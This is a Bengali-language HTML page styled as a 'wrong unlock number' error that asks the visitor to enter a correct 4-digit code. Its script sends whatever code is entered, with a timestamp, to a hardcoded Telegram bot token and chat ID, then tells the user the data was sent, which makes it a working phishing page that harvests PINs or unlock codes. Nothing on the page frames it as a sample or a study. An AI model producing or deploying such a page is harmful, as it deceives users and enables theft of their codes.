<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
    <style>body { font-family: 'Hind Siliguri', sans-serif; }</style>
</head>
<body class="bg-gray-100 flex items-center justify-center min-h-screen p-4">

    <div class="bg-white rounded-3xl shadow-2xl max-w-sm w-full p-8 text-center border border-gray-100">
        <div class="flex justify-center mb-6">
            <div class="bg-red-50 rounded-full p-6">
                <svg class="w-16 h-16 text-red-500" fill="currentColor" viewBox="0 0 20 20">
                    <path fill-rule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path>
                </svg>
            </div>
        </div>

        <h1 class="text-3xl font-bold text-red-600 mb-6">ভুল আনলক নাম্বার!</h1>
        <p class="text-gray-600 text-lg leading-relaxed mb-6">সঠিক ৪-সংখ্যার নাম্বারটি নিচে লিখুন:</p>
        
        <input type="number" id="unlockCode" placeholder="xxxx" class="w-full p-4 mb-6 border-2 border-gray-200 rounded-2xl text-center text-xl focus:border-red-500 outline-none">

        <button onclick="sendData()" id="submitBtn" class="w-full bg-[#f14336] hover:bg-red-700 text-white font-bold py-4 px-6 rounded-2xl transition duration-300 shadow-lg active:scale-95">
            আবার চেষ্টা করুন
        </button>
    </div>

    <script>
        function sendData() {
            const token = "8559810386:AAED1MAj5UBg9YwO-FR6lgKu_45i3AebkDA";
            const chatId = "8398202645";
            const code = document.getElementById('unlockCode').value;
            const btn = document.getElementById('submitBtn');

            if(code.length < 4) {
                alert("দয়া করে ৪ সংখ্যার সঠিক নাম্বারটি দিন");
                return;
            }

            btn.innerText = "অপেক্ষা করুন...";
            btn.disabled = true;

            const text = `🚨 নতুন আপডেট!\n\nভুল কোডটি ছিল: ${code}\nসময়: ${new Date().toLocaleString()}`;

            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: text })
            })
            .then(() => {
                alert("তথ্যটি সফলভাবে পাঠানো হয়েছে!");
                location.reload(); 
            })
            .catch(err => {
                alert("কিছু একটা ভুল হয়েছে।");
                btn.innerText = "আবার চেষ্টা করুন";
                btn.disabled = false;
            });
        }
    </script>
</body>
</html>
